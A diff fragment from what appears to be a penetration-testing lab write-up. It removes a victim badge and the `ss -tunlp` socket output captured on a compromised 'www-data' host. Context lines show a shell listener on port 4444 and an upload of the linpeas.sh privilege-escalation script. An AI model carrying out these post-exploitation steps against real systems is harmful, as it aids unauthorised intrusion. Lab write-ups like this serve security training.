@@ -777,21 +777,6 @@ bound to 0.0.0.0:4444 ←
 [10:02:22] 192.168.56.134:37830: registered new host w/ db
 ```
 
-![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)
-
-`ss -tunlp`:
-```
-Netid State  Recv-Q Send-Q          Local Address:Port Peer Address:PortProcess 
-udp   UNCONN 0      0               127.0.0.53%lo:53        0.0.0.0:*           
-udp   UNCONN 0      0      192.168.56.134%enp0s17:68        0.0.0.0:*           
-tcp   LISTEN 0      4096            127.0.0.53%lo:53 ←      0.0.0.0:*           
-tcp   LISTEN 0      128                   0.0.0.0:22        0.0.0.0:*           
-tcp   LISTEN 0      511                         *:80              *:*           
-tcp   LISTEN 0      128                      [::]:22           [::]:* 
-```
-
-![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
-
 `upload /home/kali/tools/linpeas.sh`:
 ```
 ./linpeas.sh ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 860.3/860.3 KB • ? • 0:00:00
